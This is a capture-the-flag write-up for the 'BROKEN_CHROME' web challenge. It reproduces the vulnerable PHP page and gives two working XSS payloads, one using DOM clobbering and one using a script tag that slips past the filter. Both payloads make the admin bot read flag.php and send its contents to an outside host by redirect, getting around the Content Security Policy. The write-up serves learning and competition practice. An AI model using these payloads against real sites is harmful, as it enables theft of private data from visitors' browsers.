# BROKEN_CHROME

## Description:

read flag.php

http://34.87.80.48:31338/?view-source

http://34.87.177.44:31338/?view-source

Note: server is running on 80 port in local.

flag format: ijctf{}

Author: sqrtrev

```
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    exit();
}

header("Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'");
$dom = $_GET['inject'];
if(preg_match("/meta|on|src|<script>|<\/script>/im",$dom))
        exit("No Hack");
?>
<html>
<?=$dom ?>
<script>
window.TASKS = window.TASKS || {
        proper: "Destination",
        dest: "https://vuln.live"
}
<?php
if(isset($_GET['ok']))
    echo "location.href = window.TASKS.dest;";
?>
</script>
<a href="check.php">Bug Report</a>
</html>
```

CSP: `default-src 'self' 'unsafe-inline' 'unsafe-eval'`

check: `meta, on, src, <script>, </script>` is in `$_GET['inject']`

The Author's Intended solution was DOM clobbering.

But, It's my bad. I filtered `<script>`. I must ban `<script`.

Payload of the Author:

http://34.87.80.48:31338/check.php?report=http://localhost/?inject=%3Ca%20id=TASKS%3E%3Ca%20id=TASKS%20name=dest%20href=%22javascript:a=`var%20rawFile=new%20XMLHttpRequest();var%20flag;rawFile.open(%27GET%27,%20%27http://localhost/flag.php%27,%20false);rawFile.o`%2b`nreadystatechange=functio`%2b`n(){if(rawFile.readyState===4)flag=rawFile.respo`%2b`nseText;}\nrawFile.send(null);locatio`%2b`n.href=%27http://vuln.live:31338/?=%27%2bflag`;eval(a)%22%3E%26ok

## My solution

Send to `check.php` the  following payload:

```
http://localhost/?inject=<script%20bad="a">var%20x%20=%20new%20XMLHttpRequest();x.open("GET","/flag.php",false);x.send();window.TASKS%20=%20{%20dest:%20"http://empty.jack.su/?flag="%2bbtoa(x["respo"%2b"nseText"])};//&ok
```

The working script:
```js
<script bad="a">
var x = new XMLHttpRequest();
x.open("GET","/flag.php",false).send();
window.TASKS={dest:"http://empty.jack.su/?flag="+btoa(x["respo"+"nseText"])};//
```

So, the script got the flag and sent it via redirect, to bypass CSP restrictions.